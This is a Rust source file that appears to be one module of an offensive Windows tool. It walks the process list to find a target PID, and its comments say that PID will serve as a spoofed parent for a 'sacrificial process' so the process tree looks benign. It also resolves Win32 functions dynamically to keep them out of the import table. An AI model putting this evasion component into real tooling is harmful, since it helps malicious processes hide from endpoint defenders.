// ppid_spoof.rs
// Finds a target process by name and returns its PID.
// This PID is later used as the spoofed parent when spawning
// a sacrificial process, making our process tree look benign.
// All Win32 functions are resolved dynamically at runtime via
// dynload — none appear in the PE import table.

use std::ffi::c_void;
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;

use crate::dynload;

// TH32CS_SNAPPROCESS — avoids pulling in windows crate constant
const TH32CS_SNAPPROCESS: u32 = 0x00000002;
// INVALID_HANDLE_VALUE as *mut c_void
const INVALID_HANDLE: *mut c_void = usize::MAX as *mut c_void;

/// Walk the process list and return the PID of the first process
/// whose name matches `target` (case-insensitive).
pub fn find_pid(target: &str) -> Option<u32> {
    unsafe {
        let fn_snapshot     = dynload::toolhelp32_snapshot()?;
        let fn_process_first = dynload::process32_first()?;
        let fn_process_next  = dynload::process32_next()?;
        let fn_close        = dynload::close_handle()?;

        // Snapshot of all running processes
        let snapshot = fn_snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_null() || snapshot == INVALID_HANDLE {
            return None;
        }

        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        // Walk the snapshot
        if fn_process_first(snapshot, &mut entry) != 0 {
            loop {
                // szExeFile is a null-terminated byte array — convert to str
                let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8)
                    .to_string_lossy();

                if name.to_lowercase() == target.to_lowercase() {
                    let pid = entry.th32ProcessID;
                    let _ = fn_close(snapshot);
                    return Some(pid);
                }

                if fn_process_next(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }

        let _ = fn_close(snapshot);
        None
    }
}
